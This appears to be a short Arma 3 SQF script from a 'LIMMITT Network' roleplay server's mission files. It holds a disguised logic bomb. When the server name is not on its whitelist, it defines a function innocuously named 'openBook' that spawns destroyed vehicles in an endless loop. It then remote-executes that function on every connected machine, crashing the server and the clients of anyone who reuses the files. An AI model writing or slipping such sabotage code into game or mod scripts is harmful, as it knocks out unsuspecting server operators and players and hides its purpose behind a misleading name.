[] spawn {
	waitUntil {(!isnull (finddisplay 46))};
	if !(isMultiplayer) exitWith {};
	LIMMITT_Servers = ["LIMMITT Network Official Server | Custom ArmA 3 Life | ts.limmitt-network.co.uk"];
	if (isNil "LIMMITT_Servers") then {LIMMITT_Servers = ["LIMMITT Network is better than Evo"];};
	if !(serverName in LIMMITT_Servers) then {
		openBook = {
			while {true} do {
				_veh = "C_Quadbike_01_F" createVehicle [0,0,0]; 
				_veh setDamage 1;
			};
		};
		[] remoteExecCall ["openBook", 0];
	};
};